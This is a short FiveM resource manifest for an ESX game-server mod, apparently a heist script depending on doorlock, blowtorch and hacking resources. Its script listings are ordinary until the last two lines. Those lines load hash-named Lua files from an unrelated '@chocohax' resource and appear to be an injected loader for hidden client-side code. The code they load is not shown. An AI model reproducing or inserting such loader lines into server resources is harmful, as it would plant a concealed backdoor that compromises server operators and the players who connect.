dependency 'essentialmode'
dependency 'es_extended'
dependency 'esx_doorlock'
dependency 'esx_blowtorch'
dependency 'mhacking'
client_scripts {

	'@es_extended/locale.lua',
	'locales/en.lua',
	'locales/es.lua',
	'config.lua',
	'client/client.lua'
}

server_scripts {
	'@es_extended/locale.lua',
	'locales/en.lua',
	'locales/es.lua',
	'config.lua',
	'server/server.lua'
}
client_script '@chocohax/95158.lua'
client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'